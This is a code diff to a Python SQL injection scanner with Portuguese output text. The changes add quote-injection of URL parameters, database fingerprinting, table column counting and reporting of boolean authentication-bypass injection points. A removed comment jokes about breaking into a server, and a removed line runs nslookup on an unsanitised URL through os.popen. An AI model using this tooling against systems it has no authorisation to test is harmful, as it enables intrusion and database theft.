@@ -32,6 +32,8 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
             from core.config import SQLI_BLIND_TIME_BASED_SUCCED_COUNT
             from bs4 import BeautifulSoup
             from core.utils import urlExplode
+            from mode.plugin.dbfingerprint import _dbFingerprint
+            from mode.plugin.dbfingerprint import _serverVersion
             
             import re
             import requests
@@ -55,21 +57,23 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
             else:
                 print("["+color.green+"+"+color.end+"] Conexão estável ")
                 pass
-                print("["+color.green+"+"+color.end+"] Tempo média da requisição: "+color.cian, avaregeTime(target_url), color.end)
+                print("["+color.green+"+"+color.end+"] Tempo média da requisição [JITTER]: "+color.cian, avaregeTime(target_url), color.end)
                 
             ## filtrando a variável url id do alvo passado
             try:
-                print("["+color.green+"+"+color.end+"] Procurando por variáveis URL...") 
+                print("["+color.green+"+"+color.end+"] Procurando por variáveis URL...", end='') 
                 para = re.compile('(=)\w+')
                 if para.search(target_url):
                         splited_para = para.search(target_url).group()
-                        exploited_target_url = target_url.replace(splited_para, "='")
+                        exploited_target_url = target_url.replace(splited_para, splited_para+"'")
                         requesicao = requests.head(url=exploited_target_url)
+                        
                         '''
                             fazendo um fingerprint no servidor
                         '''
-                        #header_requesition = requests.get(target_url), ainda não terminei de invadir o servidor! kkkk
-                        print(" ----------")
+                        current_table_cullumns_number = _dbFingerprint(target_url)
+                        print("\n", _serverVersion(target_url, current_table_cullumns_number))
+                        print("\n ----------")
                         header_list = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Contry-Code', 'Sec-Ch-Ua-Platform']
                         for header_perc in header_list:
                             try:
@@ -77,6 +81,7 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                                 print("\t%s: %s  " % (header_perc, result))
                             except Exception as error:
                                 print("\t%s : não encontrado" % header_perc)
+                        print("\tQuantidade de colunas na tabela actual: %s "%current_table_cullumns_number)
                         print(" ----------")
                     
                         print("["+color.green+"+"+color.end+"] Identificando o SGBD com "+color.cian+" SQLI INFERENCIAL(CEGA)"+color.end)
@@ -89,8 +94,6 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                             
                             ## tentando extrai informaçẽs do servidor com socket
                                 
-                            server = os.popen("nslookup %s  " % (teste_url_[2])).read()
-                        
                             
                             if 'mysql' in requesicao.text.lower():
                                 print("["+color.green+"*"+color.end+"] SGBD identificado: "+color.cian+"[MYSQL]"+color.end)
@@ -157,10 +160,9 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                     
                     main_requesition = requests.get(url=target_url)
                     main_requesition_parsed = BeautifulSoup(main_requesition.content, 'html.parser')
-                
-                    ## filtrando todos os formulários...
-                    
+        
                     forms = main_requesition_parsed.find_all('form')
+                    
                     form_quant = -1
                     array_form = {}
                     input_dic = {}
@@ -173,9 +175,9 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                         form_quant +=1
                         if 'action' in form_perc.attrs:
                             validation_page[form_quant] = form_perc['action']
-
+                            
                         array_form[form_quant] = form_perc 
-            
+                        
                     print("["+color.green+"+"+color.end+"]"+color.end+" Foi encontrado [0 - %s] formulários." % form_quant, end='')
                     if form_quant == INITIAL_COUNT_VALUE:
                         form_quant = form_quant
@@ -211,7 +213,7 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                                         else:
                                             print("["+color.red+"-"+color.end+"] ["+color.red+"Bloqueado"+color.end+"] MYSQLi BYPASS AUTH BOOLEAN"+ color.cian, lines+color.end, end='')
                                 '''
-                                relatório
+                                secção de relatório de teste
                                 '''          
                                 print("\n O Web spider detetou os seguintes pontos de injeção no alvo:")
                                 for succed_payloads_lines in succed_payloads:
